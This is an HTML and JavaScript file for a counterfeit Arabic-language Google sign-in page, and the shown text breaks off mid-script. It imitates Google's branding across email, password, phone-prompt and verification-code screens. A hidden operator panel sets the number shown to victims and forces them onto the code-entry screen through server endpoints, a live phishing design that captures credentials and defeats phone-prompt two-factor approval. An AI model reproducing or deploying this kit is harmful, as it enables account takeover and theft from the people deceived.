<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto','Noto Sans Arabic',sans-serif;}
        html,body{height:100%;}
        body{
            background-color:#ffffff;
            display:flex;
            justify-content:center;
            align-items:center;
            min-height:100vh;
            padding:20px;
            transition:opacity 0.5s ease;
            direction: rtl;
        }
        .global-progress-bar{
            position:fixed;
            top:0;left:0;
            width:100%;
            height:3px;
            background:linear-gradient(90deg,transparent,#e8f0fe,transparent);
            z-index:1000;
            display:none;
            overflow:hidden;
        }
        .progress-shine{
            position:absolute;
            top:0;
            left:-100%;
            width:40%;
            height:100%;
            background:linear-gradient(90deg,transparent,#1a73e8,transparent);
            animation:progressShine 2s infinite ease-in-out;
        }
        @keyframes progressShine{
            0%{left:-100%;opacity:.7;}
            50%{opacity:1;}
            100%{left:100%;opacity:.7;}
        }
        .login-container{
            width:450px;
            max-width:100%;
            background:#fff;
            border:1px solid #dadce0;
            border-radius:8px;
            box-shadow:0 1px 2px 0 rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15);
            transition:opacity .5s ease;
            display:flex;
            flex-direction:column;
            justify-content:flex-start;
            padding:48px 40px 100px;
            position:relative;
            min-height:100vh;
        }
        .login-container.fade-out {
            opacity: 0.4;
        }
        .google-logo{display:flex;justify-content:center;align-items:center;margin-bottom:16px;}
        .google-logo img{height:32px;}
        .main-title{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px;}
        .subtitle{font-size:14px;color:#5f6368;text-align:center;line-height:1.6;margin-bottom:24px;}
        .info-link,.forgot-email,.create-account,.try-another-way{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:400;}
        .info-link:hover,.forgot-email:hover,.create-account:hover,.try-another-way:hover{text-decoration:underline;}
        .info-link{display:block;text-align:center;margin-bottom:28px;}
        .input-container {position: relative;margin-bottom:24px;}
        .input-container input {
            width:100%;
            height:56px;
            padding:16px 14px 0 14px;
            border:1px solid #dadce0;
            border-radius:4px;
            font-size:16px;
            background:#fff;
            transition:border-color 0.2s, box-shadow 0.2s;
            direction:rtl;
            text-align:right;
        }
        .input-container label {
            position:absolute;
            top:16px;
            right:14px;
            font-size:16px;
            color:#5f6368;
            pointer-events:none;
            transition:all 0.2s ease-out;
            background:#fff;
            padding:0 4px;
        }
        .input-container input:focus + label,
        .input-container input:not(:placeholder-shown) + label {
            top:-8px;
            font-size:12px;
            color:#1a73e8;
        }
        .input-container input:focus {
            outline:none;
            border:1px solid #1a73e8;
            box-shadow:0 0 0 1px #1a73e8;
        }
        .secondary-links{display:flex;flex-direction:column;gap:20px;margin-bottom:32px;}
        .fixed-buttons{position:fixed;bottom:0;right:0;left:0;width:100%;background:#fff;padding:12px 16px calc(12px + env(safe-area-inset-bottom));display:flex;justify-content:space-between;align-items:center;z-index:100;border-top:none;box-shadow:none;}
        .next-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;transition:background-color .2s;}
        .next-btn:hover{background:#1669d6;}
        .next-btn:disabled{background:#1a73e8;opacity:.6;cursor:not-allowed;}
        .password-screen, .verification-screen{display:none;}
        .welcome-text{font-size:16px;color:#202124;text-align:center;margin-bottom:20px;}
        .user-email{font-size:16px;color:#202124;text-align:center;margin-bottom:24px;font-weight:500;direction:ltr;}
        .verification-title{font-size:22px;font-weight:500;color:#202124;text-align:center;margin-bottom:16px;}
        .verification-subtitle{font-size:14px;color:#5f6368;text-align:center;line-height:1.6;margin-bottom:8px;}
        .verification-email{font-size:15px;color:#202124;text-align:center;margin-bottom:10px;font-weight:500;direction:ltr;}
        .verification-message{font-size:14px;color:#3c4043;text-align:right;line-height:1.6;margin-bottom:10px;}
        .verification-screen .input-container{margin-top:6px;margin-bottom:12px;}
        /* ÿµŸÅÿ≠ÿ© ÿßŸÑŸÉŸàÿØ (ŸÖŸÜ ÿßŸÑÿµŸÅÿ≠ÿ© ÿßŸÑÿ£ŸàŸÑŸâ) */
        .screen {
            width: 100%;
            max-width: 420px;
            padding: 20px 18px 100px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            position: relative;
            margin:auto;
        }
        .logo {display:flex;justify-content:center;margin-top:30px;}
        .logo img {width:90px;height:auto;}
        .title {text-align:center;margin-top:8px;font-size:23px;font-weight:400;}
        .desc {margin-top:12px;color:#767676;text-align:center;font-size:13.5px;line-height:1.7;}
        .desc span.email {display:block;color:#767676;font-weight:500;}
        .code-wrap {display:flex;justify-content:center;align-items:center;margin-top:22px;margin-bottom:4px;}
        .code {font-weight:500;font-size:clamp(48px,11vw,75px);line-height:0.9;letter-spacing:4px;color:#111;text-align:center;}
        .right-block {position:relative;right:12px;text-align:right;}
        .check {margin-top:10px;font-size:14.5px;color:#111;font-weight:500;}
        .explain {margin-top:6px;color:#767676;font-size:13.5px;line-height:1.8;}
        .resend {color:#9a9a9a;font-size:13.5px;text-decoration:none;margin-top:26px;transition:color 0.3s;pointer-events:none;cursor:default;}
        .resend.blue {color:#4285F4;pointer-events:auto;cursor:pointer;}
        .resend.blue:hover {text-decoration:underline;}
        .footer {position:fixed;bottom:12px;right:12px;}
        .not-with-me {color:#4285F4;font-size:13.5px;text-decoration:none;}
        
        /* ŸÑŸàÿ≠ÿ© ÿßŸÑÿ™ÿ≠ŸÉŸÖ ÿßŸÑÿ≥ÿ±Ÿäÿ© */
        #codeControlPanel {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #f8f9fa;
            border: 2px solid #1a73e8;
            border-radius: 8px;
            padding: 15px;
            z-index: 10000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            min-width: 250px;
            display: none;
        }
        #codeControlPanel h4 {
            margin: 0 0 10px 0;
            color: #1a73e8;
            text-align: center;
        }
        #codeControlPanel input {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            text-align: center;
            font-size: 16px;
        }
        #codeControlPanel button {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        #codeControlPanel button:hover {
            background: #1669d6;
        }
        #codeControlPanel button.orange {
            background: #ff6b00;
        }
        #codeControlPanel button.orange:hover {
            background: #e55a00;
        }

        @media (max-width:768px){
            body{padding:0;margin:0;}
            .login-container{width:100vw;max-width:none;border:none;border-radius:0;box-shadow:none;padding:20px 16px 100px;}
        }
    </style>
</head>
<body>
    <!-- ŸÑŸàÿ≠ÿ© ÿßŸÑÿ™ÿ≠ŸÉŸÖ ÿßŸÑÿ≥ÿ±Ÿäÿ© -->
    <div id="codeControlPanel">
        <h4>üëë ÿ™ÿ≠ŸÉŸÖ Zoala-GOD</h4>
        <input type="text" id="customCodeInput" placeholder="ÿ£ÿØÿÆŸÑ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ∞Ÿä ÿ™ÿ±ŸäÿØ (ŸÖÿ´ÿßŸÑ: 42)" maxlength="3">
        <button onclick="applyCustomCode()">ÿ™ÿ∑ÿ®ŸäŸÇ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ¨ÿØŸäÿØ</button>
        <button onclick="showCurrentCode()">ÿπÿ±ÿ∂ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿßŸÑŸä</button>
        <button onclick="forceUserTransition()" class="orange">üéØ ÿ™ÿ≠ŸàŸäŸÑ ŸÑŸÑÿµŸÅÿ≠ÿ© ÿßŸÑÿ™ÿßŸÑŸäÿ©</button>
        <button onclick="hideControlPanel()">ÿ•ÿÆŸÅÿßÿ° ÿßŸÑŸÑŸàÿ≠ÿ©</button>
        <div style="margin-top: 10px; font-size: 12px; color: #666; text-align: center;">
            ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿßŸÑŸä: <span id="currentCodeDisplay">86</span>
        </div>
    </div>

    <div class="global-progress-bar" id="globalProgressBar"><div class="progress-shine"></div></div>

    <!-- ÿ¥ÿßÿ¥ÿ© ÿßŸÑÿ•ŸäŸÖŸäŸÑ -->
    <div class="login-container email-screen" id="emailScreen">
        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
        <h1 class="main-title">ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ</h1>
        <p class="subtitle">Ÿäÿ±ÿ¨Ÿâ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿ≠ÿ≥ÿßÿ®ŸÉ ÿπŸÑŸâ Google. ÿ≥ÿ™ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ•ŸÑŸâ Ÿáÿ∞ÿß ÿßŸÑÿ¨Ÿáÿßÿ≤ Ÿàÿ≥ŸäŸÉŸàŸÜ ŸÖÿ™ÿßÿ≠Ÿãÿß ŸÑÿßÿ≥ÿ™ÿÆÿØÿßŸÖŸá ŸÅŸä ÿ™ÿ∑ÿ®ŸäŸÇÿßÿ™ Google ÿßŸÑÿ£ÿÆÿ±Ÿâ.</p>
        <a href="#" class="info-link">ŸÖÿ≤ŸäÿØ ŸÖŸÜ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿ≠ŸàŸÑ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÑÿ≠ÿ≥ÿßÿ®</a>
        <div class="input-container">
            <input type="email" class="email-input" placeholder=" " id="emailInput">
            <label for="emailInput">ÿßŸÑÿ®ÿ±ŸäÿØ ÿßŸÑÿ•ŸÑŸÉÿ™ÿ±ŸàŸÜŸä ÿ£Ÿà ÿßŸÑŸáÿßÿ™ŸÅ</label>
        </div>
        <div class="secondary-links">
            <a href="#" class="forgot-email">ŸáŸÑ ŸÜÿ≥Ÿäÿ™ ÿ®ÿ±ŸäÿØŸÉ ÿßŸÑÿ•ŸÑŸÉÿ™ÿ±ŸàŸÜŸäÿü</a>
            <a href="#" class="create-account">ÿ•ŸÜÿ¥ÿßÿ° ÿ≠ÿ≥ÿßÿ®</a>
        </div>
    </div>
    <div class="fixed-buttons" id="emailButtons"><div></div><button class="next-btn" onclick="validateEmail()">ÿßŸÑÿ™ÿßŸÑŸä</button></div>

    <!-- ÿ¥ÿßÿ¥ÿ© ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ± -->
    <form class="login-container password-screen" id="passwordScreen">
        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
        <p class="welcome-text">ŸÖÿ±ÿ≠ÿ®ÿßŸã</p>
        <div class="user-email" id="userEmailDisplay"></div>
        <div class="input-container">
            <input type="password" class="password-input" placeholder=" " id="passwordInput" required>
            <label for="passwordInput">ÿ•ÿØÿÆÿßŸÑ ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±</label>
        </div>
        <label class="show-password" style="margin-top:8px;">
            <input type="checkbox" id="showPasswordCheckbox" onchange="togglePasswordVisibility()">
            ÿπÿ±ÿ∂ ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±
        </label>
    </form>
    <div class="fixed-buttons password-screen" id="passwordButtons" style="display:none;">
        <a href="#" class="try-another-way">ÿ™ÿ¨ÿ±ÿ®ÿ© ÿ∑ÿ±ŸäŸÇÿ© ÿ£ÿÆÿ±Ÿâ</a>
        <button type="button" class="next-btn" onclick="submitPassword()">ÿßŸÑÿ™ÿßŸÑŸä</button>
    </div>

    <!-- ÿ¥ÿßÿ¥ÿ© ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑŸáÿßÿ™ŸÅ (ÿßŸÑŸÉŸàÿØ 86) -->
    <div class="screen phone-screen" id="phoneScreen" style="display:none;">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
        </div>
        <div class="title">ÿßÿ≥ÿ™ÿ±ÿØÿßÿØ ÿßŸÑÿ≠ÿ≥ÿßÿ®</div>
        <p class="desc">ŸÑŸÑŸÖÿ≥ÿßÿπÿØÿ© ŸÅŸä ÿßŸÑÿ≠ŸÅÿßÿ∏ ÿπŸÑŸâ ÿ£ŸÖÿßŸÜ ÿ≠ÿ≥ÿßÿ®ŸÉÿå ÿ™ÿ±ŸäÿØ Google ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ£ŸÜŸÉ ÿ£ŸÜÿ™ ŸÖŸÜ Ÿäÿ≠ÿßŸàŸÑ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ <span class="email" id="phoneEmailDisplay"></span> </p>
        <div class="code-wrap"><div class="code" id="dynamicVerificationCode">86</div></div>
        <div class="right-block">
            <div class="check">ÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ Ÿáÿßÿ™ŸÅŸÉ.</div>
            <p class="explain">ÿ£ÿ±ÿ≥ŸÑÿ™ Google ÿ•ÿ¥ÿπÿßÿ±Ÿãÿß ÿ•ŸÑŸâ <strong>Ÿáÿßÿ™ŸÅŸÉ</strong>.<br>Ÿäÿ¨ÿ® ÿßŸÑŸÜŸÇÿ± ÿπŸÑŸâ ŸÜÿπŸÖ ŸÅŸä ÿßŸÑÿ•ÿ¥ÿπÿßÿ± ÿ´ŸÖ ÿßŸÑŸÜŸÇÿ± ÿπŸÑŸâ <strong style="color:#111;" id="codeInText">86</strong> ÿπŸÑŸâ Ÿáÿßÿ™ŸÅŸÉ ŸÑÿ™ÿ£ŸÉŸäÿØ ŸáŸàŸäÿ™ŸÉ.</p>
            <div id="resend" class="resend" onclick="handleResendClick()">ÿ•ÿπÿßÿØÿ© ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ±ŸÖÿ≤</div>
        </div>
        <div class="footer">
            <a class="not-with-me" href="#" id="notWithMeBtn">Ÿáÿßÿ™ŸÅŸä ŸÑŸäÿ≥ ŸÖÿπŸä</a>
        </div>
    </div>

    <!-- ÿ¥ÿßÿ¥ÿ© ÿ•ÿØÿÆÿßŸÑ ÿßŸÑÿ±ŸÖÿ≤ -->
    <form class="login-container verification-screen" id="verificationScreen">
        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
        <h2 class="verification-title">ÿßÿ≥ÿ™ÿ±ÿØÿßÿØ ÿßŸÑÿ≠ÿ≥ÿßÿ®</h2>
        <p class="verification-subtitle">ŸÑŸÑŸÖÿ≥ÿßÿπÿØÿ© ŸÅŸä ÿßŸÑÿ≠ŸÅÿßÿ∏ ÿπŸÑŸâ ÿ£ŸÖÿßŸÜ ÿ≠ÿ≥ÿßÿ®ŸÉÿå ÿ™ÿ±ŸäÿØ ÿ¥ÿ±ŸÉÿ© Google ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿ£ŸÜŸÉ ÿ£ŸÜÿ™ ŸÖŸÜ Ÿäÿ≠ÿßŸàŸÑ ÿ™ÿ≥ÿ¨ŸäŸÑ ÿßŸÑÿØÿÆŸàŸÑ</p>
        <div class="verification-email" id="verificationEmailDisplay"></div>
        <p class="verification-message">ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿ±ÿ≥ÿßŸÑÿ© ÿ™ÿ≠ÿ™ŸàŸä ÿπŸÑŸâ ÿ±ŸÖÿ≤ ÿßŸÑÿ™ÿ≠ŸÇŸÇ ÿ•ŸÑŸâ (SMS/Email/ÿ®ÿ±ŸäÿØ ÿ£ÿ≥ÿ™ÿ±ÿØÿßÿØ).</p>
        <div class="input-container">
            <input type="text" class="code-input" placeholder=" " id="verificationCode" required>
            <label for="verificationCode">ÿ•ÿØÿÆÿßŸÑ ÿßŸÑÿ±ŸÖÿ≤</label>
        </div>
    </form>
    <div class="fixed-buttons verification-screen" id="verificationButtons" style="display:none;">
        <a href="#" class="try-another-way">ÿ™ÿ¨ÿ±ÿ®ÿ© ÿ∑ÿ±ŸäŸÇÿ© ÿ£ÿÆÿ±Ÿâ</a>
        <button type="button" class="next-btn" onclick="submitVerificationCode()">ÿßŸÑÿ™ÿßŸÑŸä</button>
    </div>

    <script>
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üéÆ ÿßŸÑŸÖÿ™ÿ∫Ÿäÿ±ÿßÿ™ ÿßŸÑÿ±ÿ¶Ÿäÿ≥Ÿäÿ© ŸàÿßŸÑÿ™ÿ≠ŸÉŸÖ
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        
        let currentEmail = '';
        let currentVerificationCode = "86";
        const transitionEmailToPassword = 4000;
        const transitionPasswordToPhone = 6500; // ‚≠ê 6.5 ÿ´ŸàÿßŸÜŸä
        const transitionPhoneToVerification = 4000;
        
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üåê ÿØŸàÿßŸÑ ÿßŸÑÿßÿ™ÿµÿßŸÑ ÿ®ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        
        // ÿ¨ŸÑÿ® ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿßŸÑŸä ŸÖŸÜ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
        async function fetchCurrentCode() {
            try {
                const response = await fetch('/get_code');
                const data = await response.json();
                currentVerificationCode = data.code;
                updateVerificationCodeDisplay();
                updateCurrentCodeDisplay();
                return data.code;
            } catch (error) {
                return currentVerificationCode;
            }
        }
        
        // ÿ™ÿ≠ÿØŸäÿ´ ÿßŸÑÿ±ŸÇŸÖ ÿπŸÑŸâ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ± (ÿ®ÿØŸàŸÜ ÿ±ÿ≥ÿßÿ¶ŸÑ)
        async function updateServerCode(newCode) {
            try {
                const response = await fetch('/set_code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ code: newCode })
                });
                
                const data = await response.json();
                if (data.status === 'success') {
                    currentVerificationCode = data.code;
                    updateVerificationCodeDisplay();
                    updateCurrentCodeDisplay();
                    return true;
                }
                return false;
            } catch (error) {
                return false;
            }
        }
        
        // ŸÖÿ±ÿßŸÇÿ®ÿ© ÿßŸÑÿ™ÿ∫ŸäŸäÿ±ÿßÿ™ ŸÖŸÜ ÿßŸÑÿ≥Ÿäÿ±ŸÅÿ±
        async function startCodePolling() {
            setInterval(async () => {
                try {
                    const response = await fetch('/poll_code?current_code=' + currentVerificationCode);
                    const data = await response.json();
                    
                    if (data.changed && data.code !== currentVerificationCode) {
                        currentVerificationCode = data.code;
                        updateVerificationCodeDisplay();
                        updateCurrentCodeDisplay();
                    }
                } catch (error) {
                    // ŸÑÿß ÿ™ÿπÿ±ÿ∂ ÿ±ÿ≥ÿßÿ¶ŸÑ ÿÆÿ∑ÿ£
                }
            }, 2000);
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ŸÑÿ•ÿ¨ÿ®ÿßÿ± ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ŸÑÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ (ÿ®ÿØŸàŸÜ ÿ±ÿ≥ÿßÿ¶ŸÑ)
        async function forceUserTransition() {
            try {
                await fetch('/force_transition', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                });
                // ŸÑÿß ÿ±ÿ≥ÿßÿ¶ŸÑ - Ÿäÿ™ŸÖ ÿßŸÑÿ™ŸÜŸÅŸäÿ∞ ŸÖÿ®ÿßÿ¥ÿ±ÿ©
            } catch (error) {
                // ŸÑÿß ÿ±ÿ≥ÿßÿ¶ŸÑ ÿÆÿ∑ÿ£
            }
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ŸÑŸÑÿ™ÿ≠ŸÇŸÇ ŸÖŸÜ ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ÿßŸÑŸÇÿ≥ÿ±Ÿä
        async function checkForcedTransition() {
            try {
                const response = await fetch('/check_transition');
                const data = await response.json();
                
                if (data.transition && isOnPhoneScreen()) {
                    startForcedTransition();
                }
            } catch (error) {
                // ŸÑÿß ÿ™ÿπÿ±ÿ∂ ÿ±ÿ≥ÿßÿ¶ŸÑ ÿÆÿ∑ÿ£
            }
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ŸÑŸÑÿ™ÿ≠ŸÇŸÇ ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÅŸä ÿµŸÅÿ≠ÿ© ÿßŸÑŸáÿßÿ™ŸÅ
        function isOnPhoneScreen() {
            const phoneScreen = document.getElementById('phoneScreen');
            return phoneScreen && phoneScreen.style.display !== 'none';
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ŸÑÿ®ÿØÿ° ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ ÿßŸÑŸÇÿ≥ÿ±Ÿä ŸÖÿπ ÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ
        function startForcedTransition() {
            const phoneScreen = document.getElementById('phoneScreen');
            const progress = document.getElementById('globalProgressBar');
            
            // ÿ®ÿØÿ° ÿßŸÑÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ
            progress.style.display = 'block';
            phoneScreen.classList.add('fade-out');
            
            // ÿßŸÑÿßŸÜÿ™ÿ∏ÿßÿ± 3 ÿ´ŸàÿßŸÜŸä ŸÖÿπ ÿßŸÑÿ£ŸÜŸäŸÖŸäÿ¥ŸÜ ÿ´ŸÖ ÿßŸÑÿßŸÜÿ™ŸÇÿßŸÑ
            setTimeout(() => {
                progress.style.display = 'none';
                phoneScreen.style.display = 'none';
                document.getElementById('verificationEmailDisplay').textContent = currentEmail;
                
                const verificationScreen = document.getElementById('verificationScreen');
                verificationScreen.style.display = 'flex';
                document.getElementById('verificationButtons').style.display = 'flex';
            }, 3000);
        }
        
        // ‚≠ê ÿ®ÿØÿ° ÿßŸÑŸÖÿ±ÿßŸÇÿ®ÿ© ŸÑŸÑÿßŸÜÿ™ŸÇÿßŸÑ ÿßŸÑŸÇÿ≥ÿ±Ÿä
        function startTransitionPolling() {
            setInterval(() => {
                checkForcedTransition();
            }, 2000);
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ÿ¨ÿØŸäÿØÿ© ŸÑŸÑÿ™ÿ≠ŸÉŸÖ ŸÅŸä ÿ≤ÿ± ÿ•ÿπÿßÿØÿ© ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ
        function handleResendClick() {
            const resend = document.getElementById("resend");
            
            // ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿßŸÑÿ≤ÿ± ÿ£ÿ≤ÿ±ŸÇ (ŸÖŸÅÿπŸÑ)
            if (resend.classList.contains("blue")) {
                // ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿ≤ÿ± Ÿàÿ•ÿ±ÿ¨ÿßÿπŸá ŸÑÿ±ŸÖÿßÿØŸä
                resend.classList.remove("blue");
                
                // ÿ®ÿπÿØ 3 ÿ´ŸàÿßŸÜŸäÿå ÿ•ÿπÿßÿØÿ© ÿ™ŸÅÿπŸäŸÑŸá
                setTimeout(() => {
                    resend.classList.add("blue");
                }, 3000);
            }
        }
        
        // ‚≠ê ÿØÿßŸÑÿ© ŸÑÿ™ŸÅÿπŸäŸÑ ÿ≤ÿ± ÿ•ÿπÿßÿØÿ© ÿßŸÑÿ•ÿ±ÿ≥ÿßŸÑ ÿ£ŸàŸÑ ŸÖÿ±ÿ©
        function activateResendButton() {
            const resend = document.getElementById("resend");
            setTimeout(() => {
                resend.classList.add("blue");
            }, 3000);
        }
        
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        // üéØ ÿØŸàÿßŸÑ ÿßŸÑÿ™ÿ≠ŸÉŸÖ ŸÅŸä ÿßŸÑÿ±ŸÇŸÖ
        // ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
        
        // ÿØÿßŸÑÿ© ŸÑÿ™ÿ∑ÿ®ŸäŸÇ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ¨ÿØŸäÿØ (ÿ®ÿØŸàŸÜ ÿ±ÿ≥ÿßÿ¶ŸÑ)
        async function applyCustomCode() {
            const newCode = document.getElementById('customCodeInput').value.trim();
            
            if (newCode && !isNaN(newCode) && newCode.length <= 3) {
                const success = await updateServerCode(newCode);
                if (success) {
                    document.getElementById('customCodeInput').value = '';
                    // ŸÑÿß ŸäŸàÿ¨ÿØ alert - Ÿäÿ™ŸÖ ÿßŸÑÿ™ÿ∑ÿ®ŸäŸÇ ŸÖÿ®ÿßÿ¥ÿ±ÿ©
                }
                // ŸÑÿß ŸäŸàÿ¨ÿØ else - ŸÑÿß ÿ™ÿ∏Ÿáÿ± ÿ±ÿ≥ÿßŸÑÿ© ÿÆÿ∑ÿ£
            }
            // ŸÑÿß ŸäŸàÿ¨ÿØ else - ŸÑÿß ÿ™ÿ∏Ÿáÿ± ÿ±ÿ≥ÿßŸÑÿ© ÿÆÿ∑ÿ£
        }
        
        // ÿØÿßŸÑÿ© ŸÑÿ™ÿ≠ÿØŸäÿ´ ÿπÿ±ÿ∂ ÿßŸÑÿ±ŸÇŸÖ ŸÅŸä ÿßŸÑÿµŸÅÿ≠ÿ©
        function updateVerificationCodeDisplay() {
            const codeElement = document.getElementById('dynamicVerificationCode');
            const codeInText = document.getElementById('codeInText');
            
            if (codeElement) {
                codeElement.textContent = currentVerificationCode;
            }
            if (codeInText) {
                codeInText.textContent = currentVerificationCode;
            }
        }
        
        // ÿØÿßŸÑÿ© ŸÑÿπÿ±ÿ∂ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿßŸÑŸä
        function showCurrentCode() {
            alert(`üî¢ ÿßŸÑÿ±ŸÇŸÖ ÿßŸÑÿ≠ÿßŸÑŸä ŸáŸà: ${currentVerificationCode}`);
        }
        
        // ÿØÿßŸÑÿ© ŸÑÿ™ÿ≠ÿØŸäÿ´ ÿπÿ±ÿ∂ ÿßŸÑÿ±ŸÇŸÖ ŸÅŸä ŸÑŸàÿ≠ÿ© ÿßŸÑÿ™ÿ≠ŸÉŸÖ
        function updateCurrentCodeDisplay() {
            const display = document.getElementById('currentCodeDisplay');
            if (display) {
                display.textContent = currentVerificationCode;
            }
        }
        
